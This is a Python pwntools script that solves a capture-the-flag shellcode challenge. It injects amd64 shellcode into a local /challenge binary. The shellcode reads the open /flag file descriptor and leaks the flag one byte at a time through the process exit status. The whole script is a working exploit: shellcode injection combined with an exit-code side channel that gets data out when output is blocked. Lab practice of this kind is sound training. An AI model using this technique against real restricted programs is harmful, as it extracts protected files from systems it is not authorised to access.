from pwn import *

# set some context
context.arch = "amd64"
context.encoding = "latin"
# ignore warnings
warnings.simplefilter("ignore")

# this will contain the flag
flag = str()
# number of characters in the flag
flag_bytes = 55
# the hostname will always be the same as challenge binary
challenge_binary = os.getenv('HOSTNAME')

for i in range(0x0, flag_bytes+1):
    # read from the fd that will be referring to /flag onto the stack
    assembly = shellcraft.read(3, "rsp", flag_bytes);
    # exit with the 'i'th byte of the flag
    assembly += f"""
    xor edi, edi
    mov dil, byte ptr [rsp+{i}]
    mov rax, SYS_exit
    syscall
    """
    # launch process
    io = process([f"/challenge/{challenge_binary}", "/flag"])
    io.readrepeat(1)
    # send asm
    io.send( asm(assembly) )
    io.readrepeat(1)
    io.close()
    # check exit status, and append the ASCII equivalent to flag
    flag += chr(int(io.poll()))

# finally print the flag
print(flag)
